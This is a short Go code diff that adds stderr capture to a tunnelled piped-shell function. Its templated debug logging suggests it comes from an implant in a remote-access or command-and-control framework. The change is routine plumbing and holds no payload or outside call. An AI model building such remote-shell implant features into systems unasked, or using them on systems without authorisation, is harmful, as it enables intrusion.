@@ -95,6 +95,15 @@ func pipedShell(tunnelID uint64, command []string) (*Shell, error) {
 		return nil, err
 	}
 
+	stderr, err := cmd.StderrPipe()
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[shell] stderr pipe failed\n")
+		// {{end}}
+		cancel()
+		return nil, err
+	}
+
 	err = cmd.Start()
 
 	return &Shell{
@@ -102,6 +111,7 @@ func pipedShell(tunnelID uint64, command []string) (*Shell, error) {
 		Command: cmd,
 		Stdout:  stdout,
 		Stdin:   stdin,
+		Stderr:  stderr,
 		Cancel:  cancel,
 	}, err
 }
